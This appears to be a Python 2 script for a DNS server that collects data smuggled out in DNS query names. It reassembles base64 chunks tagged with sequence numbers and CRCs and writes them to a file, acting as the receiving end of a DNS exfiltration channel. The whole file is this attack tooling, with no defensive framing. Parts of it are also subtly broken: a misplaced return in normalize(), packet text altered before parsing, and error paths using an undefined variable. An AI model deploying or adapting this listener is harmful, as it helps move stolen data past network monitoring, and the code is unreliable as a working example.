from dnslib import *
import SocketServer
import base64
import binascii
import sys

try:
    sys.argv[1]
except:
    print('No destination file!')
    exit(1)

SLD = '.<YOUR-DOMAIN>.com'
ADDR = '0.0.0.0'
PORT = 53
REPLY_IP="0.0.0.0"
chunk_list = {}
seq_itr = 0

def normalize(data):
    # Remove label delimiters
    c = 63
    while c < len(data):
        data = data[:c] + data[c+1]
        c += 63
        return data

def decode(data):
    # Convert from base64
    print('DECODING')
    print(data)
    data = data.replace('.', '_')
    try:
        data = base64.urlsafe_b64decode(data)
    except:
        return decode(data + '=')
    return data

def generate_reply(request, domain):
    # Create reply
    reply = request.reply()
    reply.add_answer(RR(domain, QTYPE.A, rdata=A(REPLY_IP), ttl=0))
    return reply.pack()

def process_request(data):
    global chunk_list, seq_itr
    try:
        data = data.replace('.', '_')
        try:
            request = DNSRecord.parse(data)
        except:
            print("Bad Request")
            return generate_reply(request, domain)
        domain = str(request.q.qname)

        # Extract all data before the SLD
        data = domain[:len(SLD)*-1-1]

        # Cut out crc and seq
        seq = data[:2]
        crc = data[2:6]
        data = normalize(data[7:])

        # Check if data matches CRC
        if crc != '%04x' % binascii.crc_hqx(data, 0):
            print('Checksum failed for Sequence: ' + seq)
            return generate_reply(request, domain)

        # Implement sequence looping
        if seq ==  '00' and hex(255 + seq_itr)[2:] in chunk_list:
            print("!! INCREMENTED IDENTIFIER !!")
            seq_itr += 256
        try:
            chunk_itr = hex(seq_itr + int(seq, 16))[2:]
            print("CHUNK_ID: " + chunk_itr)
        except:
            print('bad chunk')
            return generate_reply(request, domain)

        # Add data if sequence is new
        if chunk_itr not in chunk_list:
            try:
                chunk_list[chunk_itr] = data
            except:
                print('bad chunk')
                return generate_reply(request, domain)

        # Display received information
        print(request)
        print('Sequence: ' + seq + ' CRC: ' + crc)
        print(data)

        # Packet shorter than max received, file is complete
        if len(data) < 224:
            temp = ''
            for i in range(len(chunk_list)):
                temp += chunk_list[hex(i)[2:]]
            print(decode(temp))

            f = open(sys.argv[1], 'w')
            f.write(decode(temp))
            f.close()
            print("Successfully wrote to " + sys.argv[1])
            exit(0)

        return generate_reply(request, domain)

class UDPHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        data = self.request[0].strip()
        socket = self.request[1]
        #message = DNSRecord.parse(data)
        socket.sendto(process_request(data), self.client_address)

print("Listening...")

server = SocketServer.UDPServer((ADDR, PORT), UDPHandler)
server.serve_forever()